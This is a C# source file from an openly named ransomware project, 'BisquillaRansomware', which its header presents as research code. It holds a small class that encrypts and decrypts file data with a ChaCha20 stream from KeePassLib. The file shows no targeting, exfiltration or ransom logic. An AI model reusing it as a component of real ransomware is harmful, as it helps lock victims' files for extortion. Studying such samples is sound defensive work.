/************************************************************************************************************
 * This code is created and maintened only for a research proposal. Please do not use for other proposes.   *
 * Author: Th3 0bservator                                                                                   *
 * Source: https://github.com/guibacellar/BisquillaRansomware                                               *
 * Site: https://www.theobservator.net                                                                      *
 ************************************************************************************************************/

using KeePassLib.Cryptography.Cipher;
using System;
using System.IO;

namespace BisquillaRansomware
{
    /// <summary>
    /// Manager to Handle File Encription
    /// </summary>
    public sealed class CriptoFileManager
    {
        private CriptoFileManager() { }

        /// <summary>
        /// File Encryptor
        /// </summary>
        /// <param name="targetStream"></param>
        /// <param name="criptoEngine"></param>
        /// <param name="sourceData"></param>
        public static void Encrypt(Stream targetStream, ref byte[] sourceData, ref byte[] key, ref byte[] iv)
        {
            // Create a Crypto Stream
            using (ChaCha20Stream cc = new ChaCha20Stream(targetStream, true, key, iv))
            {
                cc.Write(sourceData, 0, sourceData.Length);
                cc.Flush();
            }
        }

        /// <summary>
        /// File Decryptor
        /// </summary>
        /// <param name="targetStream"></param>
        /// <param name="criptoEngine"></param>
        /// <param name="sourceData"></param>
        public static void Decrypt(Stream targetStream, ref Byte[] fileEncriptedData, int startPosition, byte[] key, byte[] iv)
        {
            // Create a Decryptor
            using (ChaCha20Stream cc = new ChaCha20Stream(targetStream, true, key, iv))
            {
                cc.Write(fileEncriptedData, startPosition, fileEncriptedData.Length - startPosition);
                cc.Flush();
            }
        }
    }
}
